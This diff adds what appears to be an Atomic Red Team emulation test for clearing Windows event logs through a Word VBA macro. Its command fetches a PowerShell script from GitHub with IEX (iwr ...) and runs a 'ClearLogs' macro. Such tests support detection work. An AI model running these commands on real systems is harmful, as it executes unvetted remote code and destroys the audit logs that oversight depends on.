@@ -1,0 +1,20 @@
+#TechniqueName: Indicator Removal on Host: Clear Windows Event Logs
+#AtomicTestName: Clear Event Logs via VBA
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#prereq_commands
+try {
+  New-Object -COMObject "Word.Application" | Out-Null
+  Stop-Process -Name "winword"
+  exit 0
+} catch { exit 1 }
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+
